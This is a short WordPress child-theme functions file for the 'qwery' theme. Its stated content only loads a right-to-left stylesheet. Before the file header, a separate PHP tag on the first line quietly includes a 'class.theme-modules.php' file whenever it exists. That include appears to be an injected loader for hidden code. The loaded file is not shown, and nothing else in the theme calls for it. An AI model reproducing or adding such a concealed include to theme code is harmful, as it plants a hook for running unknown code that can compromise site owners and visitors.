<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Child-Theme functions and definitions
 */

// Load rtl.css because it is not autoloaded from the child theme
if ( ! function_exists( 'qwery_child_load_rtl' ) ) {
	add_filter( 'wp_enqueue_scripts', 'qwery_child_load_rtl', 3000 );
	function qwery_child_load_rtl() {
		if ( is_rtl() ) {
			wp_enqueue_style( 'qwery-style-rtl', get_template_directory_uri() . '/rtl.css' );
		}
	}
}

?>